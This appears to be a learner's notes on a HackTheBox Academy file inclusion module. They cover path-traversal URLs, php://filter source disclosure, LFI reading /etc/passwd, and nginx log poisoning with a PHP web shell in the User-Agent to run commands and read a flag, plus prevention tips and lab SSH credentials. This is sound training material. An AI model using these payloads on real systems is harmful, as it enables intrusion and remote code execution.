http://83.136.252.32:33222/index.php?view=../../../../../../../../../../../../../../../../../flag.txt
```

#### File Inclusion Prevention
```
## File Inclusion Prevention
- Try avoid user interaction with any file inclusion functions or API's
- Have a limited whitelist input if avoiding user interation unfeasible

## Preventing Directory traversal
- Avoiding path being traversed
- Don't allow system() function (else allows edge case)

- php code recursively remove any attempts of traversin directory:
while(substr_count($input, '../', 0)) {
    $input = str_replace('../', '', $input);
};

## Web Server Configuration
- Set allow_url_fopen and allow_url_include to Off

## Web Application Firewall (WAF)
- Use WAF and minimise false positives


ssh htb-student@10.129.16.233 HTB_@cademy_stdnt!

Q1: What is the full path to the php.ini file for Apache?

- Find the files
find / -type f -name "php.ini" 2>/dev/null

-> /etc/php/7.4/apache2/php.ini

Q2: Edit the php.ini file to block system(), then try to execute PHP Code that uses system. Read the /var/log/apache2/error.log file and fill in the blank: system() has been disabled for ________ reasons.

 - Read the file and grep the system 
cat /etc/php/7.4/apache2/php.ini | grep -n system
	-> Didn't get much, so well read the file and examine it:

cat /etc/php/7.4/apache2/php.ini

 - find a directive disable function, try disable system() there.
sudo vim /etc/php/7.4/apache2/php.ini

 - Restart apache service
sudo service apache2 restart

 - Check running services:
netstat -tunlp
	-> HTTP service opened on port 80

 - Added a file called in /var/www/html as index.php
<?php
echo "Hello, ";
system("ls -l");
echo "world!\n";
?>

 - Access the website curl
curl http://127.0.0.1/index.php

 - Read the error log:
cat /var/log/apache2/error.log
	-> PHP Warning: system() has been disabled for security reasons in /var/www/html/index.php on line 3
```

## Skills assessment
```
## Questions and scenario:
The company `INLANEFREIGHT` has contracted you to perform a web application assessment against one of their public-facing websites. They have been through many assessments in the past but have added some new functionality in a hurry and are particularly concerned about file inclusion/path traversal vulnerabilities.

They provided a target IP address and no further information about their website. Perform a full assessment of the web application checking for file inclusion and path traversal vulnerabilities.

Find the vulnerabilities and submit a final flag using the skills we covered in the module sections to complete this module.


 - Clicking around the page we see an url of the following:
http://94.237.49.182:58028/index.php?page=about

	-> Tried an input like http://94.237.49.182:58028/index.php?page=../../../../etc/hosts and saw an error message "Invalid Input detected"

	-> Testing for other LFI vulnerability:
	page=..
	....//
	all gave the same error. 

	-> This is likely a "weak" FI vulnerability, in the sense that we can only read from current directory or further ones. The most suitable attack would be an source code disclosure attempt. We first do the fuzzing, standard PHP inclusion beforehand.

-## Fuzzing for PHP files
ffuf -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -ic -u http://94.237.49.182:58028/FUZZ.php
-> about, contact, index, main, industries, error

	 - Standard PHP inclusion (on all files fuzzed, starting with index)
curl http://94.237.49.182:58028/index.php?page=php://filter/read=convert.base64-encode/resource=index
	-> name the saved base64 as index_base64

cat index_base64 | tr -d " " | base64 -d > index.php

	-> find an  ilf_admin/index.php through examining the source code file, and the vulnerability is confirmed to be a weak LFI. 

	-> Looking at ilf_admin/index.php
Seems like log files, but if we look at the url:
http://94.237.49.182:58028/ilf_admin/index.php?log=chat.log
	-> Seems suspectible to LFI, testing payload:
http://94.237.49.182:58028/ilf_admin/index.php?log=../../../../../etc/passwd
	-> confirmed LFI, need to turn this into RCE. 

	-> Look at Log poisoning attack first (less restrictive than RFI techniques)

-## Fuzzing server files
ffuf -w /opt/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://94.237.49.182:58028/ilf_admin/index.php?log=../../../../../FUZZ/index.php' 
	-> fs=2046
ffuf -w /opt/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://94.237.49.182:58028/ilf_admin/index.php?log=../../../../../FUZZ/index.php' -fs 2046
	-> webroot=/var/www/html

 - Server Logs/Configuration
ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://94.237.49.182:58028/ilf_admin/index.php?log=../../../../../FUZZ' -fs=2046

	-> Obtained /var/log/nginx/access.log
	-> Attempt on server log poisoning

-## Server Log Poisoning
 - Access log
http://94.237.49.182:58028/ilf_admin/index.php?log=../../../../../var/log/nginx/access.log

 - Poison through Burp with shell on user agent:
	 <?php system($_GET['cmd']); ?>
 - Code execution on burp:
GET /ilf_admin/index.php?log=../../../../../var/log/nginx/access.log&cmd=id 

 - Get flag (with url encoding):
GET /ilf_admin/index.php?log=../../../../../var/log/nginx/access.log&cmd=ls+/
	-> flag_dacc60f2348d.txt
GET /ilf_admin/index.php?log=../../../../../var/log/nginx/access.log&cmd=cat+/flag_dacc60f2348d.txt
```
